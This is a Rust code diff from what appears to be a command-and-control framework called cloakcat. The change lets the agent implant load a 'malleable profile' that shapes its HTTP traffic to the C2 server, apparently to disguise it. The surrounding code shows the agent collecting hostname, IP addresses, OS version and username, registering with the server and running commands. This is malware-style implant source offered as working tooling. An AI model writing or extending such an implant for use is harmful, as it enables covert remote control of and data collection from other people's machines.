@@ -20,7 +20,7 @@ use cloakcat_protocol::{
 use rand::Rng;
 use tokio::time::sleep;
 
-use crate::config::load_agent_config;
+use crate::config::{load_agent_config, load_malleable_profile};
 use crate::exec::run_command;
 use crate::host::{collect_hostname, collect_ip_addrs, collect_os_version, collect_username};
 use crate::tasks;
@@ -162,11 +162,20 @@ fn load_or_create_agent_id() -> String {
 
 pub async fn run() -> anyhow::Result<()> {
     let cfg = load_agent_config().context("config load failed")?;
-
-    let profile = profile_by_name(&cfg.profile_name);
-    let transport = HttpTransport::new(&*profile, &cfg.c2_url)?;
-
     let agent_id = load_or_create_agent_id();
+
+    // Prefer a malleable profile; fall back to the built-in name-based profile.
+    let malleable = load_malleable_profile().context("malleable profile load failed")?;
+    let (transport, endpoints) = if let Some(ref mp) = malleable {
+        let t = HttpTransport::new_malleable(mp, &cfg.c2_url)?;
+        let e = Endpoints::from_profile(&cfg.c2_url, mp, &agent_id);
+        (t, e)
+    } else {
+        let profile = profile_by_name(&cfg.profile_name);
+        let e = Endpoints::new(&cfg.c2_url, &cfg.profile_name, &agent_id);
+        let t = HttpTransport::new(&*profile, &cfg.c2_url)?;
+        (t, e)
+    };
 
     let reg = cloakcat_protocol::RegisterReq {
         agent_id: agent_id.clone(),
@@ -185,8 +194,6 @@ pub async fn run() -> anyhow::Result<()> {
         alias: cfg.alias.clone(),
         note: cfg.note.clone(),
     };
-
-    let endpoints = Endpoints::new(&cfg.c2_url, &cfg.profile_name, &agent_id);
 
     // Derive auth + signing keys from the shared master token via HKDF.
     let keys = DerivedKeys::from_master(cfg.shared_token.as_bytes());
